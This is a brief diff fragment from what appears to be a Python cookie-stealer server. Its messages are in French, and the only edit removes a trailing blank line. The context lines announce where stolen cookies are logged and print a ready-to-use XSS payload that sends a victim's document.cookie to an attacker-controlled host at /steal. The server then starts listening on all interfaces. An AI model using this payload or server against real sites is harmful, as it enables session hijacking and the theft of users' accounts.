@@ -61,4 +61,3 @@ if __name__ == '__main__':
     print(f"[*] Les cookies volés seront logués dans : {os.path.abspath(LOG_FILE)}")
     print(f"[*] Payload XSS : <script>new Image().src='http://IP:{PORT}/steal?c='+document.cookie;</script>\n")
     HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
-
